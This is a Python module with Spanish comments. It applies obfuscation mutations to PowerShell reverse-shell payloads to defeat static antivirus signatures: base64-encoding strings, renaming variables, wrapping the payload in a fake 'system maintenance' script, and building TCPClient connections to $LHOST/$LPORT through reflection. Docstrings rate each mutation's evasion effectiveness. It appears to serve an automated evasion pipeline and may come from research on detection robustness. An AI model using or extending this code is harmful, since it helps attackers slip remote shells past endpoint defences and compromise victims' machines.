import base64
import hashlib
import random
import re
import time
import logging

logger = logging.getLogger(__name__)


def apply_aggressive_mutation(payload, action, mutation_id):
    """
    Aplica mutaciones agresivas que realmente cambian el código del payload.
    
    Args:
        payload: String con el payload de PowerShell a mutar
        action: Nombre de la acción de mutación a aplicar
        mutation_id: Identificador único para esta mutación
        
    Returns:
        String con el payload mutado
        
    Raises:
        No lanza excepciones, siempre retorna un payload (puede ser el original si falla)
    """

    logger.debug(f"Aplicando mutación: {action} (ID: {mutation_id})")
    print(f"      [+] Aplicando mutación: {action}")
    
    # Guardar hash original para validación posterior
    original_hash = hashlib.md5(payload.encode()).hexdigest()

    if action == 'encode_all_strings_base64':
        """
        Codifica todos los strings literales en Base64 y los decodifica en tiempo de ejecución.
        Efectividad: Alta - Ofusca strings detectables por firmas estáticas.
        """
        # Codificar TODOS los strings en Base64
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            if string and len(string) > 2:  # No strings vacíos
                encoded = base64.b64encode(string[1:-1].encode()).decode()
                payload = payload.replace(string,
                                          f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}"))')

    elif action == 'split_commands_aggressive':
        """
        Divide comandos separados por punto y coma y líneas largas en múltiples líneas.
        Efectividad: Media - Cambia estructura pero mantiene funcionalidad.
        """
        # Dividir comandos de forma agresiva
        if ';' in payload:
            lines = payload.split(';')
            new_lines = []
            for line in lines:
                if line.strip():
                    new_lines.append(line.strip())
            payload = '\n'.join(new_lines)

        # Dividir líneas largas
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            if len(line) > 80 and '=' in line:
                parts = line.split('=')
                if len(parts) == 2:
                    new_lines.append(f"{parts[0].strip()} =")
                    new_lines.append(f"    {parts[1].strip()}")
                else:
                    new_lines.append(line)
            else:
                new_lines.append(line)
        payload = '\n'.join(new_lines)

    elif action == 'rename_all_variables':
        """
        Renombra todas las variables usando esquema basado en hash.
        Efectividad: Alta - Rompe firmas basadas en nombres de variables conocidos.
        """
        # Renombrar TODAS las variables
        variables = re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload)
        unique_vars = list(set(variables))

        for var in unique_vars:
            if var not in ['$null', '$true', '$false', '$_']:
                new_name = f"$var_{mutation_id}_{hashlib.md5(var.encode()).hexdigest()[:6]}"
                payload = payload.replace(var, new_name)

    elif action == 'add_multiple_benign_wrappers':
        """
        Envuelve el payload con código benigno que simula script de mantenimiento.
        Efectividad: Media - Puede confundir análisis estáticos.
        """
        # Añadir múltiples wrappers benignos
        wrapper = f'''
# =============================================================================
# SYSTEM MAINTENANCE SCRIPT - Build {random.randint(1000, 9999)}
# Purpose: Automated system optimization and monitoring
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# =============================================================================

function Start-SystemCheck{random.randint(100, 999)} {{
    try {{
        # Check system resources
        $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $memory = Get-WmiObject -Class Win32_ComputerSystem
        Write-Debug "System check completed" -Debug
    }} catch {{
        # Silent error handling
    }}
}}

# Initialize system monitoring
Start-SystemCheck{random.randint(100, 999)}

'''
        payload = wrapper + payload + f'''

# =============================================================================
# SCRIPT EXECUTION COMPLETED
# Cleanup temporary resources
# =============================================================================

Remove-Variable * -ErrorAction SilentlyContinue
[System.GC]::Collect()
'''

    elif action == 'change_entire_syntax':
        """
        Reemplaza nombres de métodos y propiedades con variantes personalizadas.
        Efectividad: Baja - Puede romper funcionalidad si no se maneja correctamente.
        """
        # Cambiar sintaxis completamente
        replacements = [
            ('New-Object', 'NewObject'),
            ('GetStream()', 'GetStreamMethod()'),
            ('StreamReader', 'StreamReaderClass'),
            ('StreamWriter', 'StreamWriterClass'),
            ('TCPClient', 'TCPClientClass'),
            ('DataAvailable', 'DataAvailableProperty'),
            ('AutoFlush', 'AutoFlushProperty'),
            ('Connected', 'ConnectedProperty')
        ]

        for old, new in replacements:
            payload = payload.replace(old, new)

    elif action == 'insert_random_whitespace':
        """
        Añade espacios aleatorios al inicio de líneas y líneas vacías.
        Efectividad: Muy Baja - Solo cambia formato, no afecta detección.
        """
        # Insertar espacios en blanco aleatorios
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            # Añadir espacios aleatorios al inicio
            spaces = ' ' * random.randint(0, 8)
            new_lines.append(spaces + line)

            # Añadir líneas vacías aleatorias
            if random.random() > 0.7:
                new_lines.append('')

        payload = '\n'.join(new_lines)

    elif action == 'obfuscate_network_calls':
        """
        Reemplaza creación directa de TCPClient con reflexión.
        Efectividad: Alta - Ofusca llamadas de red comúnmente detectadas.
        """
        # Ofuscar llamadas de red específicamente para tu payload
        if 'TCPClient' in payload:
            # Reemplazar TCPClient con creación más compleja
            payload = payload.replace(
                'New-Object Net.Sockets.TCPClient($LHOST, $LPORT)',
                f'''$tcpType = [System.Net.Sockets.TCPClient]
$tcpConstructor = $tcpType.GetConstructor(@([string], [int]))
$TCPClient = $tcpConstructor.Invoke(@($LHOST, $LPORT))'''
            )

    elif action == 'use_reflection_methods':
        """
        Reemplaza llamadas directas a métodos con invocación usando reflexión.
        Efectividad: Alta - Ofusca llamadas a métodos detectables.
        """
        # Usar reflexión para métodos comunes
        reflection_replacements = [
            ('GetStream()', '.GetType().GetMethod("GetStream").Invoke($TCPClient, @())'),
            ('Read(', '.GetType().GetMethod("Read").Invoke($NetworkStream, @($Buffer, 0, $Buffer.Length))'),
            ('Write(', '.GetType().GetMethod("Write").Invoke($StreamWriter, @("$Output`n"))'),
            ('Close()', '.GetType().GetMethod("Close").Invoke($TCPClient, @())')
        ]

        for old, new in reflection_replacements:
            if old in payload:
                payload = payload.replace(old, new)

    elif action == 'add_fake_error_handling':
        """
        Añade bloques try-catch falsos alrededor de líneas aleatorias.
        Efectividad: Baja - Añade ruido sin mejorar evasión significativamente.
        """
        # Añadir manejo de errores falso por todas partes
        lines = payload.split('\n')
        new_lines = []

        for line in lines:
            new_lines.append(line)
            if random.random() > 0.6 and line.strip() and not line.strip().startswith('#'):
                error_handler = f'''try {{
    # Temporary operation
    $temp = Get-Date
}} catch [System.Exception] {{
    # Suppress all errors
}}'''
                new_lines.append(error_handler)

        payload = '\n'.join(new_lines)

    elif action == 'modify_encoding_methods':
        """
        Cambia métodos de encoding de UTF8 a codificación por número de página.
        Efectividad: Media - Cambia sintaxis pero mantiene funcionalidad.
        """
        # Modificar métodos de encoding
        if 'text.encoding' in payload:
            payload = payload.replace(
                '([text.encoding]::UTF8).GetString',
                '[System.Text.Encoding]::GetEncoding(65001).GetString'
            )

    # Verificar que el payload realmente cambió
    mutated_hash = hashlib.md5(payload.encode()).hexdigest()
    if original_hash == mutated_hash:
        logger.warning(f"Mutación {action} no cambió el payload, aplicando fallback")
        print("      [+] Mutación no aplicada, usando fallback...")
        # Fallback más agresivo: añadir comentarios y espacios
        lines = payload.split('\n')
        if len(lines) > 0:
            # Añadir comentario al inicio
            lines.insert(0, f'# Mutation: {action} - ID: {mutation_id} - {time.strftime("%Y%m%d_%H%M%S")}')
            # Añadir comentario al final
            lines.append(f'# End mutation: {action}')
            # Añadir línea vacía aleatoria
            if len(lines) > 2:
                insert_pos = random.randint(1, len(lines) - 2)
                lines.insert(insert_pos, '')
            payload = '\n'.join(lines)
            
            # Verificar que el fallback realmente cambió el payload
            final_hash = hashlib.md5(payload.encode()).hexdigest()
            if final_hash == original_hash:
                # Último recurso: añadir caracteres invisibles
                payload = f'# {mutation_id}\n{payload}\n# {hashlib.md5(mutation_id.encode()).hexdigest()[:8]}'
                logger.warning(f"Fallback básico falló, usando fallback de emergencia para {action}")
    else:
        logger.debug(f"Mutación {action} aplicada exitosamente (hash cambió)")

    return payload


def analyze_payload_detailed(payload):
    """
    Análisis detallado del payload.
    
    Extrae features estructurales del payload para análisis y representación de estados.
    
    Returns:
        Diccionario con:
        - original: payload original
        - length: longitud del payload
        - lines: número de líneas
        - has_semicolons: si contiene punto y coma
        - has_newlines: si contiene saltos de línea
        - variables: lista de variables únicas encontradas
        - methods: lista de métodos únicos encontrados
        - objects: lista de objetos únicos creados con New-Object
        - strings: lista de strings encontrados
        - ip_addresses: direcciones IP encontradas
        - ports: puertos encontrados
        - hash: hash MD5 del payload (primeros 16 caracteres)
    """
    structure = {
        'original': payload,
        'length': len(payload),
        'lines': payload.count('\n') + 1,
        'has_semicolons': ';' in payload,
        'has_newlines': '\n' in payload,
        'variables': list(set(re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload))),
        'methods': list(set(re.findall(r'\.\w+\(', payload))),
        'objects': list(set(re.findall(r'New-Object\s+([^\s\(]+)', payload))),
        'strings': re.findall(r'"[^"]*"', payload),
        'ip_addresses': re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', payload),
        'ports': re.findall(r'LPORT\s*=\s*(\d+)', payload)
    }

    # Calcular hash
    structure['hash'] = hashlib.md5(payload.encode()).hexdigest()[:16]

    return structure


def validate_mutation_applied(original_payload, mutated_payload):
    """
    Valida que la mutación se haya aplicado realmente comparando hashes y contenido.
    
    Args:
        original_payload: Payload original antes de la mutación
        mutated_payload: Payload después de aplicar la mutación
        
    Returns:
        Tupla (bool, str): 
        - True si la mutación se aplicó, False en caso contrario
        - Mensaje descriptivo del resultado
    """
    original_hash = hashlib.md5(original_payload.encode()).hexdigest()
    mutated_hash = hashlib.md5(mutated_payload.encode()).hexdigest()

    if original_hash == mutated_hash:
        return False, "No changes detected"

    # Verificar cambios visuales
    original_lines = original_payload.split('\n')
    mutated_lines = mutated_payload.split('\n')

    if len(original_lines) == len(mutated_lines) and original_payload == mutated_payload:
        return False, "Identical content"

    return True, f"Mutation applied: {len(original_lines)} -> {len(mutated_lines)} lines, hash changed"
